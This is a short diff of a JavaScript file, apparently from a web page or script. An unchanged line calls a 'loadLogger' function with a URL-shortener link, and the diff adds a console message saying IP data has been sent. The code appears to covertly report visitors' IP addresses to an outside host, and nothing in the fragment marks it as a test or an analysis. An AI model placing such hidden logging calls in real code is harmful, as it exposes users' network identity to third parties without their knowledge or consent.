@@ -10,3 +10,4 @@ function loadLogger(url) {
 }
 
 loadLogger('https://yip.su/RN5Cp1');
+console.log("ip-data has been send");
